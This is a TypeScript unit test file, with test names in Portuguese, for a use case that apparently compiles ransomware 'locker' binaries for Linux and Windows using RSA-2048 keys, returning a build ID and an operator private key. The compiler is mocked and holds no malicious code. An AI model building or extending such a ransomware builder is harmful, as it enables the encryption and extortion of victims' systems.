import { describe, it, expect, beforeEach } from "vitest";
import { CompileRansomUseCase } from "../../../src/application/ransom/use-cases/CompileRansomUseCase.js";
import { MockRansomCompiler } from "../../mocks/MockRansomCompiler.js";
import { Result } from "../../../src/shared/Result.js";

describe("CompileRansomUseCase", () => {
  let compiler: MockRansomCompiler;
  let useCase: CompileRansomUseCase;
  let logs: string[];

  beforeEach(() => {
    compiler = new MockRansomCompiler();
    useCase = new CompileRansomUseCase(compiler);
    logs = [];
  });

  const onLog = (msg: string) => logs.push(msg);

  it("deve compilar para Linux com sucesso", async () => {
    const result = await useCase.execute("linux", onLog);

    expect(result.isSuccess).toBe(true);
    expect(result.value!.binaryPath).toContain("locker_linux");
    expect(result.value!.buildId).toBe("456");
    expect(result.value!.privKeyPem).toContain("BEGIN PRIVATE KEY");
    expect(compiler.calls).toEqual(["linux"]);
  });

  it("deve compilar para Windows com sucesso", async () => {
    compiler.result = Result.ok({
      binaryPath: "/tmp/builds/789/locker_win.exe",
      buildId: "789",
      privKeyPem: "-----BEGIN PRIVATE KEY-----\nWIN\n-----END PRIVATE KEY-----\n",
    });

    const result = await useCase.execute("windows", onLog);

    expect(result.isSuccess).toBe(true);
    expect(result.value!.binaryPath).toContain("locker_win.exe");
    expect(compiler.calls).toEqual(["windows"]);
  });

  it("deve logar RSA-2048 e SO no início", async () => {
    await useCase.execute("linux", onLog);

    expect(logs.some((l) => l.includes("RSA-2048"))).toBe(true);
    expect(logs.some((l) => l.includes("LINUX"))).toBe(true);
  });

  it("deve logar WINDOWS ao compilar para windows", async () => {
    await useCase.execute("windows", onLog);

    expect(logs.some((l) => l.includes("WINDOWS"))).toBe(true);
  });

  it("deve logar buildId e path do binário no sucesso", async () => {
    await useCase.execute("linux", onLog);

    expect(logs.some((l) => l.includes("Binário"))).toBe(true);
    expect(logs.some((l) => l.includes("Build ID"))).toBe(true);
  });

  it("deve logar aviso sobre chave privada", async () => {
    await useCase.execute("linux", onLog);

    expect(logs.some((l) => l.includes("chave privada RSA"))).toBe(true);
  });

  it("deve retornar falha e logar erro quando compilador falha", async () => {
    compiler.result = Result.fail("OpenSSL não encontrado na imagem Docker");

    const result = await useCase.execute("linux", onLog);

    expect(result.isFailure).toBe(true);
    expect(result.error).toBe("OpenSSL não encontrado na imagem Docker");
    expect(logs.some((l) => l.includes("[ERROR]"))).toBe(true);
  });

  it("deve funcionar sem onLog (callback opcional)", async () => {
    const result = await useCase.execute("linux");

    expect(result.isSuccess).toBe(true);
    expect(compiler.calls).toEqual(["linux"]);
  });

  it("deve propagar erro do compilador sem onLog", async () => {
    compiler.result = Result.fail("Erro");

    const result = await useCase.execute("windows");

    expect(result.isFailure).toBe(true);
    expect(result.error).toBe("Erro");
  });
});
